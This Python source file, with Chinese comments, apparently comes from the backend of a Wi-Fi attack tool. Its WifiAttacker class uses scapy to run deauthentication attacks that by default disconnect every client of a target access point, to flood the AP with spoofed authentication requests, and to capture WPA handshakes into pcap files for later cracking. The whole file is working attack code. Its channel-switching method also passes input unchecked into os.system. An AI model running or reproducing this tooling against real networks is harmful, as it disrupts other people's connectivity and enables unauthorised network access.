# backend/app/modules/wifi/attacker.py

import threading
import time
import os
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt
from datetime import datetime

# 设置 scapy 不要在控制台输出过多乱七八糟的警告
conf.verb = 0


class WifiAttacker:
    def __init__(self, interface="wlan0mon"):
        self.interface = interface
        self.is_running = False
        self.packet_count = 0
        self.handshake_captured = False
        self.target_bssid = None
        self.target_channel = 1
        self.save_path = "./captures/"

        # 确保保存目录存在
        if not os.path.exists(self.save_path):
            os.makedirs(self.save_path)

    def set_channel(self, channel):
        """切换网卡信道"""
        try:
            # 使用系统命令切换信道 (比 scapy 更稳定)
            os.system(f"iwconfig {self.interface} channel {channel}")
            self.target_channel = channel
            print(f"[*] 网卡 {self.interface} 已切换至信道 {channel}")
        except Exception as e:
            print(f"[!] 切换信道失败: {e}")

    # ============================
    # 1. 监听模块 (负责抓包)
    # ============================
    def start_sniffing(self, bssid, stop_event):
        """后台线程：持续监听握手包"""
        self.target_bssid = bssid
        filename = f"{self.save_path}handshake_{bssid.replace(':', '')}_{int(time.time())}.pcap"
        print(f"[*] 开始监听目标 {bssid}，保存至 {filename}")

        # EAPOL 协议过滤器 (EtherType 0x888E)
        # 这里的 filter 语法是 BPF 语法
        bpf_filter = "ether proto 0x888e"

        def packet_handler(pkt):
            if pkt.haslayer(EAPOL):
                # 检查是否属于我们的目标 AP
                if (pkt.addr2 == bssid or pkt.addr3 == bssid):
                    print(f"[+] 捕获到 EAPOL 数据包! 源: {pkt.addr2}")
                    wrpcap(filename, pkt, append=True)  # 追加写入文件
                    self.handshake_captured = True
                    # 这里可以添加逻辑：如果抓齐了4个包，就通知前端

        try:
            sniff(
                iface=self.interface,
                prn=packet_handler,
                filter=bpf_filter,
                stop_filter=lambda x: stop_event.is_set()
            )
        except Exception as e:
            print(f"[!] 监听线程出错: {e}")

    # ============================
    # 2. 攻击模块 - Deauth (经典)
    # ============================
    def attack_deauth(self, bssid, client="ff:ff:ff:ff:ff:ff", count=10):
        """
        发送 Deauth 包强制断线
        :param client: 默认广播攻击(踢所有)，也可以指定特定 MAC
        """
        print(f"[*] 发动 Deauth 攻击 -> AP: {bssid} | Client: {client}")

        # 构建 802.11 Deauth 帧
        # Reason 7: Class 3 frame received from nonassociated station
        pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)

        # 快速发包
        for _ in range(count):
            if not self.is_running: break
            sendp(pkt, iface=self.interface, verbose=False, count=1)
            time.sleep(0.1)  # 稍微间隔一下防止堵塞网卡

    # ============================
    # 3. 攻击模块 - Auth Flood (洪水)
    # ============================
    def attack_auth_flood(self, bssid, count=50):
        """
        发送大量伪造的 Authentication 请求
        试图让 AP 忙碌或出错，有时能诱发握手包
        """
        print(f"[*] 发动 Auth Flood 攻击 -> {bssid}")
        for i in range(count):
            if not self.is_running: break
            # 随机生成虚假源 MAC
            rand_mac = RandMAC()
            pkt = RadioTap() / Dot11(addr1=bssid, addr2=rand_mac, addr3=bssid) / Dot11Auth(algo=0, seqnum=1, status=0)
            sendp(pkt, iface=self.interface, verbose=False)
            time.sleep(0.05)

    # ============================
    # 4. 总控逻辑
    # ============================
    def run_attack_cycle(self, bssid, channel, attack_type="deauth"):
        """
        启动一次完整的 抓包+攻击 循环
        """
        self.is_running = True
        self.handshake_captured = False

        # 1. 切信道
        self.set_channel(channel)

        # 2. 启动监听线程
        stop_event = threading.Event()
        sniff_thread = threading.Thread(target=self.start_sniffing, args=(bssid, stop_event))
        sniff_thread.daemon = True
        sniff_thread.start()

        # 3. 执行攻击
        try:
            print(f"[*] 攻击循环开始: {attack_type}")
            # 持续攻击 60 秒或直到停止
            for _ in range(10):
                if not self.is_running: break

                if attack_type == "deauth":
                    self.attack_deauth(bssid)
                elif attack_type == "flood":
                    self.attack_auth_flood(bssid)

                # 攻击一波后暂停几秒，等待客户端重连（因为重连时才会发握手包）
                print("[*] 暂停攻击，等待客户端重连...")
                time.sleep(5)

        finally:
            self.is_running = False
            stop_event.set()  # 停止监听
            print("[*] 攻击循环结束")

        return self.handshake_captured